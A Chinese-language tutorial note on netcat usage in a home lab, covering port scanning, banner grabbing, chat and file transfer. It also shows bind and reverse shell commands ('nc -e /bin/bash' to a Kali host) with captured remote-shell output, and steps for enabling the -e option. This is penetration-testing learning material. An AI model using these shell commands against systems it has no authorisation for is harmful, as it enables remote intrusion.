##### nc工具使用总结
1. 端口扫描

```bash
nc -zvn 192.168.2.124 21-56
nc: connect to 192.168.2.124 port 21 (tcp) failed: Connection refused
Connection to 192.168.2.124 22 port [tcp/*] succeeded!
nc: connect to 192.168.2.124 port 23 (tcp) failed: Connection refused
nc: connect to 192.168.2.124 port 24 (tcp) failed: Connection refused
nc: connect to 192.168.2.124 port 25 (tcp) failed: Connection refused
nc: connect to 192.168.2.124 port 26 (tcp) failed: Connection refused

# -z 参数告诉nc使用0IO，连接成功后立即关闭连接，不进行交互
# -v 详细输出
# -n 告诉nc不使用DNS反向查询IP地址的域名
```

2. 获取主机banner信息

```bash
nc -v 192.168.2.124 22
Connection to 192.168.2.124 22 port [tcp/ssh] succeeded!
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
```

3. nc聊天室功能

```bash
# server

nc l 8433

hello world
hello


# client
nc 192.168.2.124 8443

hello world
hello
```

4. nc文件传输

```bash
# 服务器向客户端发送文件,客户端接收文件
# a server
nc -l 8443 < t.txt # 对外提供t.txt这个文件，等着客户端来接收

# b client
nc -n 192.168.2.124 8443 > t.txt # 将来自192.168.2.124传输的文件流重定向到t.txt这个文件

# a作为服务器传输的文件为t.txt(此时a服务器的箭头为`<`)，b客户端去连接a服务器时，a将文件传输给b(此时b客户端的箭头为 `>`)


# 客户端向服务器发送文件
# c server
nc -l 8443 > h.txt # 等待接收来自客户端的文件流，并将其重定向到h.txt这个文件

# d client
nc 192.168.2.124 8443 < file.txt # 向服务器发送file.txt这个文件

# c作为服务器等待请求接收文件流(此时c服务器的箭头为`>`),d作为客户端向c发送文件(此时d的箭头为`<`)

```

5. nc反弹shell

5.1  正向反弹shell

```bash
# Ubuntu
# 先执行,等待连接
nc -lvp 8843 -t -e /bin/bash
listening on [any] 8843 ...
connect to [192.168.2.124] from admin.lan [192.168.2.207] 55380


# Kali
# 后连接
ncat 192.168.2.124 8843
ls
t.txt
wlp3s0.pcap
```

5.2 反向反弹shell

```bash
# Kali先监听
ncat -lvp 8443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 192.168.2.124.
Ncat: Connection from 192.168.2.124:51364.
ls
t.txt
wlp3s0.pcap
ifconfig
enp0s25: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 68:f7:28:70:ab:59  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 20  memory 0xf0600000-f0620000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 798  bytes 77222 (77.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 798  bytes 77222 (77.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlp3s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.124  netmask 255.255.255.0  broadcast 192.168.2.255
        inet6 fe80::1c91:fdd0:812a:fa55  prefixlen 64  scopeid 0x20<link>
        ether 5c:c5:d4:b3:41:29  txqueuelen 1000  (Ethernet)
        RX packets 563850  bytes 611307283 (611.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 127744  bytes 15712086 (15.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

# Ubuntu,执行反弹shell命令
nc -e /bin/bash 192.168.2.207 8443 # 这里的ip地址端口为kali上的ip地址端口
```


Note: 解决nc无法使用`-e`选项的方法
```bash
sudo apt-get -y install netcat-traditional # 安装netcat-traditional

sudo update-alternatives --config nc # 运行配置命令,会出现如下界面，选择nc.traditional所在的编号即输入2,这样就可以正常使用`-e`参数了

There are 2 choices for the alternative nc (providing /bin/nc).

  Selection    Path                 Priority   Status
------------------------------------------------------------
* 0            /bin/nc.openbsd       50        auto mode
  1            /bin/nc.openbsd       50        manual mode
  2            /bin/nc.traditional   10        manual mode
```



---
that's all
